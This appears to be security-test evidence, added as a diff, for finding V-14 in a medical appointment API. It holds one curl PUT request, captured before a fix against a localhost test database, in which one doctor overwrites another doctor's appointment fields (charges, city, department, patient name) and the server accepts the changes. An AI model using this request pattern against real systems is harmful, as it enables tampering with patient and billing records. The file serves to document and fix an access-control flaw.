@@ -1,0 +1,36 @@
+V-14 Any doctor can rewrite any field of any appointment
+========================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:36:51Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : curl 8.15.0  (real curl, output unedited)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+Variables used below (values come from security-tests/.tokens.json):
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab55fac2afa3227fe052584
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab55fac2afa3227fe052580
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab55fad2afa3227fe052588   (Dr Beta's id: 6ab55fad2afa3227fe05258b)
+  MED1=6ab55fad2afa3227fe05258e  MED2=6ab55fad2afa3227fe05258f  CART_ID=6ab55fad2afa3227fe052783  APPT_ID=6ab55fad2afa3227fe052785
+
+------------------------------------------------------------------------------
+Seeded values: patientFirstName "Alice", appointmentCharges "3000", city "Kandy",
+department "Oncology", status "Pending", doctor = Dr Beta.
+
+Dr Alpha updates Dr Beta's appointment, sending fields other than status:
+$ curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" -H "Cookie: $ALPHA" -H "Content-Type: application/json" -d "{\"status\":\"Accepted\",\"appointmentCharges\":\"1\",\"city\":\"HACKED\",\"department\":\"HACKED-DEPT\",\"patientFirstName\":\"Overwritten\"}"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 543
+ETag: W/"21f-718J4jQMYQR1L4f39oykfM/1f3c"
+Date: Thu, 24 Sep 2026 17:36:51 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":{"_id":"6ab55fad2afa3227fe052785","patient":"6ab55fac2afa3227fe05257e","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab55fad2afa3227fe05258b","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-24T17:36:45.448Z","updatedAt":"2026-09-24T17:36:51.548Z","__v":0},"message":"Appointment Status Updated!"}
+
+Every submitted field is in the stored document, on an appointment that belongs to another doctor.
